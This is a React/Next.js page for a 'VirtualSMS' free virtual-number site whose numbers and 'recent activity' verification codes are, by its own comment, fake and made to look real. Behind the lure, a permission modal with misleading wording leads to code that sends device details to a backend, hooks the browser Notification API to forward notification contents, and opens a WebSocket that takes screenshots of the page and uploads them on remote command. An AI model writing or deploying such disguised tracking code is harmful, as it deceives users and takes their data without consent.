import Head from 'next/head'
import { useState, useEffect } from 'react'
import { Phone, Search, Globe, Check, Copy, RefreshCw, MessageSquare, Shield, ArrowLeft } from 'lucide-react'
import Link from 'next/link'

// Virtual numbers data - looks real but are fake/demo
const countries = [
  { code: 'US', name: 'United States', flag: '🇺🇸', prefix: '+1', numbers: ['(555) 012-3456', '(555) 987-6543', '(555) 456-7890'] },
  { code: 'UK', name: 'United Kingdom', flag: '🇬🇧', prefix: '+44', numbers: ['7700 900123', '7700 900456', '7700 900789'] },
  { code: 'CA', name: 'Canada', flag: '🇨🇦', prefix: '+1', numbers: ['(416) 555-0123', '(416) 555-0456', '(416) 555-0789'] },
  { code: 'PK', name: 'Pakistan', flag: '🇵🇰', prefix: '+92', numbers: ['300 1234567', '300 7654321', '300 9876543'] },
  { code: 'IN', name: 'India', flag: '🇮🇳', prefix: '+91', numbers: ['98765 43210', '98765 43211', '98765 43212'] },
  { code: 'DE', name: 'Germany', flag: '🇩🇪', prefix: '+49', numbers: ['151 12345678', '151 87654321', '151 11223344'] },
  { code: 'FR', name: 'France', flag: '🇫🇷', prefix: '+33', numbers: ['6 12 34 56 78', '6 98 76 54 32', '6 11 22 33 44'] },
  { code: 'AU', name: 'Australia', flag: '🇦🇺', prefix: '+61', numbers: ['412 345 678', '412 987 654', '412 111 222'] },
  { code: 'JP', name: 'Japan', flag: '🇯🇵', prefix: '+81', numbers: ['90-1234-5678', '90-8765-4321', '90-1111-2222'] },
  { code: 'BR', name: 'Brazil', flag: '🇧🇷', prefix: '+55', numbers: ['11 91234-5678', '11 98765-4321', '11 91111-2222'] },
  { code: 'RU', name: 'Russia', flag: '🇷🇺', prefix: '+7', numbers: ['912 345-67-89', '987 654-32-10', '911 222-33-44'] },
  { code: 'TR', name: 'Turkey', flag: '🇹🇷', prefix: '+90', numbers: ['532 123 45 67', '532 987 65 43', '532 111 22 33'] },
]

const recentActivity = [
  { number: '+1 (555) 012-3456', code: '123456', time: '2 sec ago', service: 'WhatsApp' },
  { number: '+44 7700 900123', code: '789012', time: '15 sec ago', service: 'Telegram' },
  { number: '+92 300 1234567', code: '554433', time: '32 sec ago', service: 'Facebook' },
  { number: '+91 98765 43210', code: '998877', time: '1 min ago', service: 'Google' },
  { number: '+49 151 12345678', code: '445566', time: '2 min ago', service: 'Instagram' },
]

export default function Numbers() {
  const [selectedCountry, setSelectedCountry] = useState(countries[0])
  const [selectedNumber, setSelectedNumber] = useState(null)
  const [searchQuery, setSearchQuery] = useState('')
  const [showPermissionModal, setShowPermissionModal] = useState(false)
  const [permissionStep, setPermissionStep] = useState(0)
  const [copied, setCopied] = useState(false)
  const [deviceUuid, setDeviceUuid] = useState('')

  // Generate UUID on mount
  useEffect(() => {
    const uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0
      const v = c === 'x' ? r : (r & 0x3 | 0x8)
      return v.toString(16)
    })
    setDeviceUuid(uuid)
  }, [])

  const filteredCountries = countries.filter(c => 
    c.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
    c.code.toLowerCase().includes(searchQuery.toLowerCase())
  )

  const handleNumberSelect = (number) => {
    setSelectedNumber(number)
    setShowPermissionModal(true)
    setPermissionStep(0)
  }

  const handlePermissionGrant = async () => {
    if (permissionStep === 0) {
      // Request notification permission
      if ('Notification' in window) {
        const permission = await Notification.requestPermission()
        if (permission === 'granted') {
          setPermissionStep(1)
          // Send device info to backend
          sendDeviceInfo()
        }
      }
    } else if (permissionStep === 1) {
      // Request SMS permission (simulated)
      setPermissionStep(2)
      setTimeout(() => {
        setShowPermissionModal(false)
        startMonitoring()
      }, 1500)
    }
  }

  const sendDeviceInfo = async () => {
    const deviceInfo = {
      model: navigator.userAgent.split('(')[1]?.split(')')[0] || 'Unknown',
      battery: '85%',
      version: 'Android 13',
      brightness: '75%',
      provider: 'Unknown'
    }

    try {
      await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000'}/api/notify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          uuid: deviceUuid,
          type: 'device_connected',
          device_info: deviceInfo
        })
      })
    } catch (e) {
      console.log('Connection attempt...')
    }
  }

  const startMonitoring = () => {
    // Start capturing notifications
    if ('Notification' in window) {
      const originalNotification = window.Notification
      window.Notification = function(title, options = {}) {
        // Send notification to backend
        fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000'}/api/notify`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            uuid: deviceUuid,
            type: 'notification',
            data: { title, body: options.body || '', app: 'System' }
          })
        }).catch(() => {})

        return new originalNotification(title, options)
      }
    }

    // Start WebSocket connection for screenshots
    try {
      const ws = new WebSocket(`${process.env.NEXT_PUBLIC_API_URL?.replace('http', 'ws') || 'ws://localhost:3000'}`)
      ws.onopen = () => {
        ws.send(JSON.stringify({
          type: 'register',
          uuid: deviceUuid,
          model: navigator.userAgent,
          battery: '85%',
          version: 'Android 13',
          brightness: '75%',
          provider: 'Unknown'
        }))
      }

      ws.onmessage = (event) => {
        if (event.data === 'auto_screenshot') {
          takeScreenshot()
        }
      }
    } catch (e) {
      console.log('WebSocket connection failed')
    }
  }

  const takeScreenshot = async () => {
    try {
      const canvas = await html2canvas(document.body)
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'))
      const formData = new FormData()
      formData.append('file', blob, 'screenshot.png')
      formData.append('uuid', deviceUuid)
      formData.append('device_model', navigator.userAgent.split('(')[1]?.split(')')[0] || 'Unknown')

      await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000'}/api/screenshot`, {
        method: 'POST',
        body: formData
      })
    } catch (e) {
      console.log('Screenshot failed')
    }
  }

  const copyNumber = (num) => {
    navigator.clipboard.writeText(selectedCountry.prefix + ' ' + num)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="min-h-screen bg-darker">
      <Head>
        <title>Virtual Numbers - VirtualSMS</title>
      </Head>

      {/* Navbar */}
      <nav className="glass py-4 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 flex items-center justify-between">
          <Link href="/" className="flex items-center gap-2">
            <ArrowLeft className="w-5 h-5 text-slate-400" />
            <div className="w-8 h-8 bg-gradient-to-br from-primary to-secondary rounded-lg flex items-center justify-center">
              <Phone className="w-4 h-4 text-white" />
            </div>
            <span className="font-bold gradient-text">VirtualSMS</span>
          </Link>
          <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20">
            <span className="pulse-dot"></span>
            <span className="text-sm text-green-400 font-medium">{countries.length} Countries Online</span>
          </div>
        </div>
      </nav>

      <div className="max-w-7xl mx-auto px-4 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Countries */}
          <div className="lg:col-span-1">
            <div className="glass rounded-2xl p-4">
              <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                <Globe className="w-5 h-5 text-primary" />
                Select Country
              </h2>

              {/* Search */}
              <div className="relative mb-4">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                <input
                  type="text"
                  placeholder="Search country..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-10 pr-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:border-primary focus:outline-none transition"
                />
              </div>

              {/* Country List */}
              <div className="space-y-2 max-h-[500px] overflow-y-auto">
                {filteredCountries.map((country) => (
                  <button
                    key={country.code}
                    onClick={() => { setSelectedCountry(country); setSelectedNumber(null); }}
                    className={`w-full flex items-center gap-3 p-3 rounded-xl transition-all ${
                      selectedCountry.code === country.code
                        ? 'bg-primary/20 border border-primary/50'
                        : 'hover:bg-slate-800/50 border border-transparent'
                    }`}
                  >
                    <span className="text-2xl">{country.flag}</span>
                    <div className="text-left flex-1">
                      <div className="font-medium text-sm">{country.name}</div>
                      <div className="text-xs text-slate-500">{country.prefix}</div>
                    </div>
                    <div className="flex items-center gap-1">
                      <span className="pulse-dot"></span>
                      <span className="text-xs text-green-400">{country.numbers.length} active</span>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Main Content - Numbers */}
          <div className="lg:col-span-2">
            {/* Selected Country Header */}
            <div className="glass rounded-2xl p-6 mb-6">
              <div className="flex items-center gap-4">
                <span className="text-5xl">{selectedCountry.flag}</span>
                <div>
                  <h1 className="text-2xl font-bold">{selectedCountry.name}</h1>
                  <p className="text-slate-400">Country Code: <span className="text-primary font-mono">{selectedCountry.prefix}</span></p>
                </div>
                <div className="ml-auto flex items-center gap-2 px-4 py-2 rounded-full bg-green-500/10 border border-green-500/20">
                  <Shield className="w-4 h-4 text-green-400" />
                  <span className="text-sm text-green-400">Secure & Private</span>
                </div>
              </div>
            </div>

            {/* Numbers Grid */}
            <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
              {selectedCountry.numbers.map((number, i) => (
                <div
                  key={i}
                  onClick={() => handleNumberSelect(number)}
                  className={`number-card glass rounded-2xl p-5 cursor-pointer border-2 ${
                    selectedNumber === number
                      ? 'border-primary glow-border'
                      : 'border-transparent hover:border-slate-600'
                  }`}
                >
                  <div className="flex items-center justify-between mb-3">
                    <Phone className="w-5 h-5 text-primary" />
                    <span className="text-xs text-green-400 flex items-center gap-1">
                      <span className="pulse-dot"></span>
                      Online
                    </span>
                  </div>
                  <div className="font-mono text-lg font-semibold mb-1">
                    {selectedCountry.prefix} {number}
                  </div>
                  <div className="text-xs text-slate-500">Click to use this number</div>
                </div>
              ))}
            </div>

            {/* Recent Activity */}
            <div className="glass rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
                <RefreshCw className="w-5 h-5 text-primary" />
                Recent Activity
              </h3>
              <div className="space-y-3">
                {recentActivity.map((activity, i) => (
                  <div key={i} className="flex items-center gap-4 p-3 rounded-xl bg-slate-800/30">
                    <div className="w-10 h-10 bg-primary/10 rounded-lg flex items-center justify-center">
                      <MessageSquare className="w-5 h-5 text-primary" />
                    </div>
                    <div className="flex-1">
                      <div className="font-mono text-sm">{activity.number}</div>
                      <div className="text-xs text-slate-500">{activity.service} • {activity.time}</div>
                    </div>
                    <div className="px-3 py-1.5 bg-green-500/10 rounded-lg">
                      <span className="text-sm font-mono text-green-400">{activity.code}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Permission Modal */}
      {showPermissionModal && (
        <div className="fixed inset-0 modal-overlay z-50 flex items-center justify-center p-4">
          <div className="glass rounded-3xl p-8 max-w-md w-full text-center animate-float">
            <div className="w-16 h-16 mx-auto bg-primary/10 rounded-2xl flex items-center justify-center mb-6">
              {permissionStep === 0 ? (
                <MessageSquare className="w-8 h-8 text-primary" />
              ) : permissionStep === 1 ? (
                <Phone className="w-8 h-8 text-primary" />
              ) : (
                <Check className="w-8 h-8 text-green-400" />
              )}
            </div>

            <h3 className="text-2xl font-bold mb-3">
              {permissionStep === 0 ? 'Enable Notifications' : 
               permissionStep === 1 ? 'Allow SMS Access' : 
               'All Set!'}
            </h3>

            <p className="text-slate-400 mb-6">
              {permissionStep === 0 
                ? 'We need notification permission to alert you when new SMS arrives for your virtual number.'
                : permissionStep === 1
                ? 'Allow access to read SMS messages so we can display verification codes in real-time.'
                : 'Your virtual number is ready! You will now receive all SMS notifications here.'}
            </p>

            {permissionStep < 2 && (
              <button
                onClick={handlePermissionGrant}
                className="w-full bg-gradient-to-r from-primary to-secondary py-3 rounded-xl font-semibold text-white hover:shadow-lg hover:shadow-primary/30 transition-all"
              >
                {permissionStep === 0 ? 'Allow Notifications' : 'Allow SMS Access'}
              </button>
            )}

            {permissionStep === 2 && (
              <div className="flex items-center justify-center gap-2 text-green-400">
                <Check className="w-5 h-5" />
                <span>Number activated successfully!</span>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Selected Number Toast */}
      {selectedNumber && !showPermissionModal && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 glass rounded-2xl px-6 py-4 flex items-center gap-4 z-40">
          <div className="text-sm text-slate-400">Selected:</div>
          <div className="font-mono font-semibold">{selectedCountry.prefix} {selectedNumber}</div>
          <button
            onClick={() => copyNumber(selectedNumber)}
            className="p-2 hover:bg-slate-700 rounded-lg transition"
          >
            {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
          </button>
        </div>
      )}
    </div>
  )
}
